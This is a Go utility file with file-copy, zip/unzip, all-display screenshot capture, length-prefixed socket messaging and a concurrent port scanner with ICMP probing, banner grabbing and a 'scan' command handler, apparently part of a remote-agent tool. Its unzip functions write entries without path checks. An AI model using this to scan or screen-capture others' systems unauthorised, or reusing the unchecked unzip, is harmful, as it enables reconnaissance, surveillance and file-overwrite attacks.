package functions

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"image/png"
	"io"
	"io/fs"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kbinani/screenshot"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

/// FS

func CopyFile(src, dst string, info fs.FileInfo) error {
	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer func(source *os.File) {
		_ = source.Close()
	}(source)

	var mode os.FileMode = 0644
	if runtime.GOOS != "windows" {
		mode = info.Mode()
	}

	dest, err := os.OpenFile(dst, os.O_RDWR|os.O_CREATE|os.O_TRUNC, mode)
	if err != nil {
		return err
	}
	defer func(dest *os.File) {
		_ = dest.Close()
	}(dest)

	_, err = io.Copy(dest, source)
	return err
}

func CopyDir(srcDir, dstDir string) error {
	srcInfo, err := os.Stat(srcDir)
	if err != nil {
		return err
	}

	var mode os.FileMode = 0755
	if runtime.GOOS != "windows" {
		mode = srcInfo.Mode()
	}

	err = os.MkdirAll(dstDir, mode)
	if err != nil {
		return err
	}

	entries, err := os.ReadDir(srcDir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(srcDir, entry.Name())
		dstPath := filepath.Join(dstDir, entry.Name())

		info, err := entry.Info()
		if err != nil {
			return err
		}

		if info.IsDir() {
			err = CopyDir(srcPath, dstPath)
			if err != nil {
				return err
			}
		} else {
			err = CopyFile(srcPath, dstPath, info)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

/// ZIP

func ZipBytes(data []byte, name string) ([]byte, error) {
	var buf bytes.Buffer
	zipWriter := zip.NewWriter(&buf)

	writer, err := zipWriter.Create(name)
	if err != nil {
		return nil, err
	}

	_, err = writer.Write(data)
	if err != nil {
		return nil, err
	}

	err = zipWriter.Close()
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func UnzipBytes(zipData []byte) (map[string][]byte, error) {
	result := make(map[string][]byte)
	reader := bytes.NewReader(zipData)

	zipReader, err := zip.NewReader(reader, int64(len(zipData)))
	if err != nil {
		return nil, err
	}

	for _, file := range zipReader.File {
		rc, err := file.Open()
		if err != nil {
			return nil, err
		}
		defer rc.Close()

		var buf bytes.Buffer
		_, err = io.Copy(&buf, rc)
		if err != nil {
			return nil, err
		}

		result[file.Name] = buf.Bytes()
	}

	return result, nil
}

func ZipFile(srcFilePath string) ([]byte, error) {
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)

	fileToZip, err := os.Open(srcFilePath)
	if err != nil {
		return nil, err
	}
	defer fileToZip.Close()

	info, err := fileToZip.Stat()
	if err != nil {
		return nil, err
	}

	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return nil, err
	}
	header.Name = filepath.Base(srcFilePath)
	header.Method = zip.Deflate

	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return nil, err
	}

	_, err = io.Copy(writer, fileToZip)
	if err != nil {
		return nil, err
	}

	if err := zipWriter.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func UnzipFile(zipPath string, targetDir string) error {
	r, err := zip.OpenReader(zipPath)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {
		destPath := filepath.Join(targetDir, f.Name)

		// Создание директорий
		if f.FileInfo().IsDir() {
			err = os.MkdirAll(destPath, os.ModePerm)
			if err != nil {
				return err
			}
			continue
		}

		// Убедимся, что директория существует
		err = os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
		if err != nil {
			return err
		}

		dstFile, err := os.Create(destPath)
		if err != nil {
			return err
		}
		defer dstFile.Close()

		srcFile, err := f.Open()
		if err != nil {
			return err
		}
		defer srcFile.Close()

		_, err = io.Copy(dstFile, srcFile)
		if err != nil {
			return err
		}
	}

	return nil
}

func ZipDirectory(srcDir string) ([]byte, error) {
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)

	err := filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(srcDir, path)
		if err != nil {
			return err
		}
		if info.IsDir() {
			if relPath == "." {
				return nil
			}
			relPath += "/"
			_, err = zipWriter.Create(relPath)
			return err
		}

		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		header.Name = relPath
		header.Method = zip.Deflate

		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}

		_, err = io.Copy(writer, file)
		return err
	})
	if err != nil {
		return nil, err
	}

	if err := zipWriter.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func UnzipDirectory(zipData []byte, targetDir string) error {
	reader := bytes.NewReader(zipData)
	zipReader, err := zip.NewReader(reader, int64(len(zipData)))
	if err != nil {
		return err
	}

	for _, f := range zipReader.File {
		destPath := filepath.Join(targetDir, f.Name)

		if f.FileInfo().IsDir() {
			err := os.MkdirAll(destPath, os.ModePerm)
			if err != nil {
				return err
			}
			continue
		}

		err := os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
		if err != nil {
			return err
		}

		dstFile, err := os.Create(destPath)
		if err != nil {
			return err
		}
		defer dstFile.Close()

		srcFile, err := f.Open()
		if err != nil {
			return err
		}
		defer srcFile.Close()

		_, err = io.Copy(dstFile, srcFile)
		if err != nil {
			return err
		}
	}

	return nil
}

/// SCREENS

func Screenshots() (map[int][]byte, error) {
	result := make(map[int][]byte)
	num := screenshot.NumActiveDisplays()
	for i := 0; i < num; i++ {
		img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(i))
		if err != nil {
			return nil, err
		}
		buf := new(bytes.Buffer)
		err = png.Encode(buf, img)
		if err != nil {
			return nil, err
		}
		result[i] = buf.Bytes()
	}
	return result, nil
}

/// NET

func ConnRead(conn net.Conn, size int) ([]byte, error) {
	if size <= 0 {
		return nil, fmt.Errorf("incorrected size: %d", size)
	}

	message := make([]byte, 0, size)
	tmpBuff := make([]byte, 1024)
	readSize := 0

	for readSize < size {
		toRead := size - readSize
		if toRead < len(tmpBuff) {
			tmpBuff = tmpBuff[:toRead]
		}

		n, err := conn.Read(tmpBuff)
		if err != nil {
			return nil, err
		}

		message = append(message, tmpBuff[:n]...)
		readSize += n
	}
	return message, nil
}

func RecvMsg(conn net.Conn) ([]byte, error) {
	bufLen, err := ConnRead(conn, 4)
	if err != nil {
		return nil, err
	}
	msgLen := binary.BigEndian.Uint32(bufLen)

	return ConnRead(conn, int(msgLen))
}

func SendMsg(conn net.Conn, data []byte) error {
	if conn == nil {
		return errors.New("conn is nil")
	}

	msgLen := make([]byte, 4)
	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
	message := append(msgLen, data...)
	_, err := conn.Write(message)
	return err
}

/// PORT SCAN

// PortInfo 端口信息结构
type PortInfo struct {
	Port   int
	Status string
	Banner string
}

// ScanResult 扫描结果结构
type ScanResult struct {
	Host        string
	OpenPorts   []PortInfo
	ScannedCount int
	Duration    time.Duration
}

// isHostAlive 使用 ICMP 探活检测主机是否在线
func isHostAlive(host string) bool {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return true // 权限不足时跳过探活，继续扫描
	}
	defer conn.Close()

	dst, err := net.ResolveIPAddr("ip4", host)
	if err != nil {
		return false
	}

	msg := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:  os.Getpid() & 0xffff,
			Seq: 1,
			Data: []byte("PING"),
		},
	}

	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		return false
	}

	if _, err := conn.WriteTo(msgBytes, dst); err != nil {
		return false
	}

	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	reply := make([]byte, 1500)
	_, _, err = conn.ReadFrom(reply)
	return err == nil
}

// grabBanner 从端口抓取 Banner 信息（带重试机制）
func grabBanner(host string, port int) string {
	addr := fmt.Sprintf("%s:%d", host, port)
	maxRetries := 2

	for attempt := 0; attempt <= maxRetries; attempt++ {
		conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
		if err != nil {
			if attempt < maxRetries {
				time.Sleep(100 * time.Millisecond) // 短暂延迟后重试
				continue
			}
			return ""
		}
		defer conn.Close()

		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		banner := make([]byte, 1024)
		n, err := conn.Read(banner)
		if err != nil && err != io.EOF {
			if attempt < maxRetries {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			return ""
		}

		if n > 0 {
			// 清理非可打印字符
			bannerStr := string(banner[:n])
			bannerStr = strings.TrimSpace(bannerStr)
			// 移除控制字符
			reg := regexp.MustCompile(`[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]`)
			bannerStr = reg.ReplaceAllString(bannerStr, "")
			return bannerStr
		}

		if attempt < maxRetries {
			time.Sleep(100 * time.Millisecond)
		}
	}
	return ""
}

// scanPort 扫描单个端口
func scanPort(host string, port int, results chan<- PortInfo, wg *sync.WaitGroup) {
	defer wg.Done()

	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	banner := grabBanner(host, port)
	results <- PortInfo{
		Port:   port,
		Status: "open",
		Banner: banner,
	}
}

// parseIPRange 解析 IP 范围字符串（支持 CIDR 和 IP 段）
func parseIPRange(ipRange string) ([]string, error) {
	// 检查是否为 CIDR 表示法
	if strings.Contains(ipRange, "/") {
		return parseCIDR(ipRange)
	}

	// 检查是否为 IP 段表示法
	if strings.Contains(ipRange, "-") {
		return parseIPSegment(ipRange)
	}

	// 单个 IP
	if net.ParseIP(ipRange) != nil {
		return []string{ipRange}, nil
	}

	return nil, fmt.Errorf("invalid IP range: %s", ipRange)
}

// parseCIDR 解析 CIDR 表示法（如 192.168.1.0/24）
func parseCIDR(cidr string) ([]string, error) {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, fmt.Errorf("invalid CIDR: %s", cidr)
	}

	ips := []string{}
	for ip := ipnet.IP.Mask(ipnet.Mask); ipnet.Contains(ip); incrementIP(ip) {
		// 跳过网络地址和广播地址
		if !isNetworkOrBroadcast(ip, ipnet) {
			ips = append(ips, ip.String())
		}
	}

	return ips, nil
}

// parseIPSegment 解析 IP 段表示法（如 192.168.1.1-192.168.1.10）
func parseIPSegment(segment string) ([]string, error) {
	parts := strings.Split(segment, "-")
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid IP segment: %s", segment)
	}

	startIP := net.ParseIP(strings.TrimSpace(parts[0]))
	endIP := net.ParseIP(strings.TrimSpace(parts[1]))

	if startIP == nil || endIP == nil {
		return nil, fmt.Errorf("invalid IP in segment: %s", segment)
	}

	// 转换为 IPv4
	startIP = startIP.To4()
	endIP = endIP.To4()
	if startIP == nil || endIP == nil {
		return nil, fmt.Errorf("only IPv4 ranges supported")
	}

	// 比较 IP 大小
	if ipToInt(startIP) > ipToInt(endIP) {
		startIP, endIP = endIP, startIP
	}

	ips := []string{}
	for ip := copyIP(startIP); ipToInt(ip) <= ipToInt(endIP); incrementIP(ip) {
		ips = append(ips, ip.String())
	}

	return ips, nil
}

// ipToInt 将 IPv4 地址转换为整数
func ipToInt(ip net.IP) uint32 {
	ip = ip.To4()
	return uint32(ip[0])<<24 | uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
}

// intToIP 将整数转换为 IPv4 地址
func intToIP(i uint32) net.IP {
	return net.IPv4(byte(i>>24), byte(i>>16), byte(i>>8), byte(i))
}

// incrementIP 将 IP 地址加 1
func incrementIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// copyIP 复制 IP 地址
func copyIP(ip net.IP) net.IP {
	dup := make(net.IP, len(ip))
	copy(dup, ip)
	return dup
}

// isNetworkOrBroadcast 检查 IP 是否为网络地址或广播地址
func isNetworkOrBroadcast(ip net.IP, ipnet *net.IPNet) bool {
	// 检查是否为网络地址
	if ip.Equal(ipnet.IP) {
		return true
	}

	// 检查是否为广播地址
	broadcast := copyIP(ipnet.IP)
	for i := 0; i < len(broadcast); i++ {
		broadcast[i] |= ^ipnet.Mask[i]
	}
	if ip.Equal(broadcast) {
		return true
	}

	return false
}

// parsePortRange 解析端口范围字符串
func parsePortRange(portRange string) ([]int, error) {
	var ports []int
	parts := strings.Split(portRange, ",")

	for _, part := range parts {
		part = strings.TrimSpace(part)
		if strings.Contains(part, "-") {
			// 处理范围 "80-443"
			rangeParts := strings.Split(part, "-")
			if len(rangeParts) != 2 {
				return nil, fmt.Errorf("invalid port range: %s", part)
			}

			start, err := strconv.Atoi(strings.TrimSpace(rangeParts[0]))
			if err != nil {
				return nil, fmt.Errorf("invalid port: %s", rangeParts[0])
			}

			end, err := strconv.Atoi(strings.TrimSpace(rangeParts[1]))
			if err != nil {
				return nil, fmt.Errorf("invalid port: %s", rangeParts[1])
			}

			if start > end {
				start, end = end, start
			}

			for p := start; p <= end; p++ {
				if p >= 1 && p <= 65535 {
					ports = append(ports, p)
				}
			}
		} else {
			// 处理单个端口
			port, err := strconv.Atoi(part)
			if err != nil {
				return nil, fmt.Errorf("invalid port: %s", part)
			}
			if port >= 1 && port <= 65535 {
				ports = append(ports, port)
			}
		}
	}

	if len(ports) == 0 {
		return nil, errors.New("no valid ports specified")
	}

	return ports, nil
}

// ScanResult 扫描结果结构（已有定义，这里只是注释）
// 注意：支持单个主机或多个主机的扫描结果

// ScanPorts 执行并发端口扫描（默认 15 个并发）
func ScanPorts(host string, portRange string) (*ScanResult, error) {
	return ScanPortsWithConcurrency(host, portRange, 15)
}

// ScanIPRange 扫描 IP 范围（支持 CIDR 和 IP 段）
func ScanIPRange(ipRange string, portRange string) ([]string, error) {
	return ScanIPRangeWithConcurrency(ipRange, portRange, 15)
}

// ScanIPRangeWithConcurrency 扫描 IP 范围（可配置并发数）
func ScanIPRangeWithConcurrency(ipRange string, portRange string, concurrency int) ([]string, error) {
	// 解析 IP 范围
	ips, err := parseIPRange(ipRange)
	if err != nil {
		return nil, err
	}

	if len(ips) == 0 {
		return nil, fmt.Errorf("no valid IPs in range: %s", ipRange)
	}

	// 限制扫描数量（防止过大的范围）
	maxIPs := 256 // 最多扫描 256 个 IP
	if len(ips) > maxIPs {
		return nil, fmt.Errorf("IP range too large: %d IPs (max %d)", len(ips), maxIPs)
	}

	var results []string
	var resultsMutex sync.Mutex
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, concurrency)

	for _, ip := range ips {
		wg.Add(1)
		go func(targetIP string) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			result, err := ScanPortsWithConcurrency(targetIP, portRange, 1)
			if err == nil && len(result.OpenPorts) > 0 {
				resultsMutex.Lock()
				for _, port := range result.OpenPorts {
					results = append(results, fmt.Sprintf("%s:%d - %s", targetIP, port.Port, port.Banner))
				}
				resultsMutex.Unlock()
			}
		}(ip)
	}

	wg.Wait()
	return results, nil
}

// ScanPortsWithConcurrency 执行并发端口扫描（可配置并发数）
func ScanPortsWithConcurrency(host string, portRange string, concurrency int) (*ScanResult, error) {
	// 验证 IP 地址
	if net.ParseIP(host) == nil {
		return nil, fmt.Errorf("invalid host: %s", host)
	}

	// 验证并发数
	if concurrency < 1 {
		concurrency = 1
	}
	if concurrency > 100 {
		concurrency = 100 // 最大 100 个并发，防止资源耗尽
	}

	// 解析端口范围
	ports, err := parsePortRange(portRange)
	if err != nil {
		return nil, err
	}

	startTime := time.Now()

	// 探活检测
	if !isHostAlive(host) {
		return &ScanResult{
			Host:         host,
			OpenPorts:    []PortInfo{},
			ScannedCount: 0,
			Duration:     time.Since(startTime),
		}, nil
	}

	// 并发扫描
	results := make(chan PortInfo, len(ports))
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, concurrency) // 可配置的并发 worker

	for _, port := range ports {
		wg.Add(1)
		go func(p int) {
			semaphore <- struct{}{}        // 获取信号量
			defer func() { <-semaphore }() // 释放信号量
			scanPort(host, p, results, &wg)
		}(port)
	}

	// 等待所有扫描完成
	go func() {
		wg.Wait()
		close(results)
	}()

	// 收集结果
	var openPorts []PortInfo
	for portInfo := range results {
		openPorts = append(openPorts, portInfo)
	}

	// 按端口号排序
	for i := 0; i < len(openPorts)-1; i++ {
		for j := i + 1; j < len(openPorts); j++ {
			if openPorts[i].Port > openPorts[j].Port {
				openPorts[i], openPorts[j] = openPorts[j], openPorts[i]
			}
		}
	}

	return &ScanResult{
		Host:         host,
		OpenPorts:    openPorts,
		ScannedCount: len(ports),
		Duration:     time.Since(startTime),
	}, nil
}

// HandleScanCommand 处理 scan 命令
func HandleScanCommand(args []string) string {
	return HandleScanCommandWithOptions(args, 15, false)
}

// HandleScanCommandWithOptions 处理 scan 命令（支持并发数和调试模式）
func HandleScanCommandWithOptions(args []string, concurrency int, debug bool) string {
	if len(args) < 2 {
		return "Usage: scan <host|ip_range> <port_range>\n" +
			"Examples:\n" +
			"  scan 192.168.1.1 80-443          (single host)\n" +
			"  scan 192.168.1.0/24 80            (CIDR range)\n" +
			"  scan 192.168.1.1-192.168.1.10 80  (IP segment)"
	}

	hostOrRange := args[0]
	portRange := args[1]

	if debug {
		fmt.Printf("[DEBUG] Starting scan: target=%s, port_range=%s, concurrency=%d\n", hostOrRange, portRange, concurrency)
	}

	// 检测是否为 IP 范围
	if strings.Contains(hostOrRange, "/") || strings.Contains(hostOrRange, "-") {
		// IP 范围扫描
		if debug {
			fmt.Printf("[DEBUG] Detected IP range format\n")
		}

		results, err := ScanIPRangeWithConcurrency(hostOrRange, portRange, concurrency)
		if err != nil {
			errMsg := fmt.Sprintf("Error: %v", err)
			if debug {
				fmt.Printf("[DEBUG] Range scan error: %s\n", errMsg)
			}
			return errMsg
		}

		if debug {
			fmt.Printf("[DEBUG] Range scan completed: found %d results\n", len(results))
		}

		// 格式化输出
		var output strings.Builder
		output.WriteString(fmt.Sprintf("IP Range: %s\n", hostOrRange))
		output.WriteString(fmt.Sprintf("Port Range: %s\n", portRange))

		if len(results) == 0 {
			output.WriteString("No open ports found\n")
		} else {
			output.WriteString(fmt.Sprintf("Found %d open ports:\n", len(results)))
			for _, result := range results {
				output.WriteString(fmt.Sprintf("  %s\n", result))
			}
		}

		return output.String()
	}

	// 单个主机扫描
	result, err := ScanPortsWithConcurrency(hostOrRange, portRange, concurrency)
	if err != nil {
		errMsg := fmt.Sprintf("Error: %v", err)
		if debug {
			fmt.Printf("[DEBUG] Scan error: %s\n", errMsg)
		}
		return errMsg
	}

	if debug {
		fmt.Printf("[DEBUG] Scan completed: found %d open ports in %.2fs\n", len(result.OpenPorts), result.Duration.Seconds())
	}

	// 格式化输出
	var output strings.Builder
	output.WriteString(fmt.Sprintf("Host: %s\n", result.Host))
	output.WriteString(fmt.Sprintf("Scanned: %d ports in %.2fs\n", result.ScannedCount, result.Duration.Seconds()))

	if len(result.OpenPorts) == 0 {
		output.WriteString("No open ports found\n")
	} else {
		output.WriteString("Open Ports:\n")
		for _, port := range result.OpenPorts {
			if port.Banner != "" {
				output.WriteString(fmt.Sprintf("  %-5d - %s\n", port.Port, port.Banner))
			} else {
				output.WriteString(fmt.Sprintf("  %-5d - (no banner)\n", port.Port))
			}
		}
	}

	return output.String()
}
